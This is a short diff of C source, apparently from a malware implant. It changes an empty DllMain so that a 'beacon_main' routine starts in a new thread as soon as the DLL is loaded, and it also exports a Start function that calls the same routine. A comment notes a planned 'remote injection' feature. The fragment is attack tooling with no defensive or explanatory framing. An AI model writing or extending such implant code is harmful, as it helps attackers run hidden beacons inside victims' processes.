@@ -181,7 +181,14 @@ int beacon_main(void) {
 
 // TODO: add remote injection 
 #ifdef BUILD_DLL
-BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) { return TRUE; }
+BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
+    (void)h; (void)r;
+    if (reason == DLL_PROCESS_ATTACH) {
+        HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_main, NULL, 0, NULL);
+        if (t) CloseHandle(t);
+    }
+    return TRUE;
+}
 __declspec(dllexport) void Start(void) {
     beacon_main();
 }
